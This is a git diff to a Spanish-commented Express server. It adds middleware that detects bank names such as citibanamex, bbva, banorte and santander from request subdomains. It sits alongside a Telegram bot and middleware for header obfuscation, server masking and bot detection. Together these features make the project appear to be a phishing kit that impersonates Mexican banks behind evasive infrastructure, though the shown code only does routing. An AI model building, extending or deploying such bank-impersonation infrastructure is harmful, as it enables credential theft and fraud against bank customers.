@@ -6,6 +6,15 @@ import dotenv from "dotenv";
 import { obfuscateHeaders, serverMasking, botDetection, errorObfuscation, dynamicRateLimit } from "./middleware/security";
 import "./telegramBot"; // Inicializar bot de Telegram
 
+// Extender el tipo Request para incluir bankFromSubdomain
+declare global {
+  namespace Express {
+    interface Request {
+      bankFromSubdomain?: string;
+    }
+  }
+}
+
 // Cargar variables de entorno
 dotenv.config();
 
@@ -24,6 +33,29 @@ app.use(cookieParser());
 // Configuración del entorno
 const APP_TYPE = process.env.APP_TYPE || 'admin';
 console.log(`Ejecutando en modo: ${APP_TYPE}`);
+
+// Middleware para manejar subdominios de bancos
+app.use((req, res, next) => {
+  const host = req.headers.host || '';
+  const hostParts = host.split('.');
+  
+  // Verificar si es un subdominio de banco (formato: banco.dominio.com)
+  if (hostParts.length >= 3) {
+    const subdomain = hostParts[0].toLowerCase();
+    const baseDomain = hostParts.slice(1).join('.');
+    
+    // Lista de bancos válidos
+    const validBanks = ['liverpool', 'citibanamex', 'banbajio', 'bbva', 'banorte', 'bancoppel', 'hsbc', 'amex', 'santander', 'scotiabank', 'invex', 'banregio', 'spin', 'platacard', 'bancoazteca', 'bienestar'];
+    
+    if (validBanks.includes(subdomain)) {
+      // Agregar información del banco al request
+      req.bankFromSubdomain = subdomain.toUpperCase();
+      console.log(`[Subdomain] Detectado banco desde subdominio: ${req.bankFromSubdomain} en ${host}`);
+    }
+  }
+  
+  next();
+});
 
 // Configurar CORS para permitir diferentes dominios
 app.use((req, res, next) => {
